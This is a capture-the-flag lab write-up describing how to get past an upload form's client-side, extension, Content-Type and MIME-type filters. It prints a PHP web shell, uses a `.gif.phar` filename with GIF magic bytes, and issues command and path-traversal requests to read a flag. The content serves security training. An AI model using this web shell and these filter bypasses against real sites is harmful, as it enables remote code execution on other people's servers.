## Challenge

The above server employs Client-Side, Blacklist, Whitelist, Content-Type, and MIME-Type filters to ensure the uploaded file is an image. Try to combine all of the attacks you learned so far to bypass these filters and upload a PHP file and read the flag at "/flag.txt" 

## Solution

As in **Lab.5** I tried the Sniper Attack by using the `payloadallthethings` for the php extensions, and in the same way I found out that the `.phar` extension is among some extensions that gets the response `File successfully uploaded` while the other extensions get a `Extension not allowed`.

The difference is that now when I try to upload the shell `<?php system($_REQUEST['cmd']); ?>` with the filename `.phar.jpg` it shows `Only images are allowed`, so it doesn't work that way, and there is a possibility that it checks the `Mime-Type`.

Let's add the `gif` extension magic bytes `GIF87a` at the start of the file and the filename with the extension `.gif.phar`, and we got a `File successfully uploaded`.

Now if we go to `http://94.237.54.190:31723/profile_images/cat.gif.phar?cmd=whoami` we have the answer `GIF8 www-data`.

Then by going to `/profile_images/cat.gif.phar?cmd=cat%20../../../../flag.txt` we have the flag `GIF8 HTB{m461c4l_c0n73n7_3xpl0174710n}`.



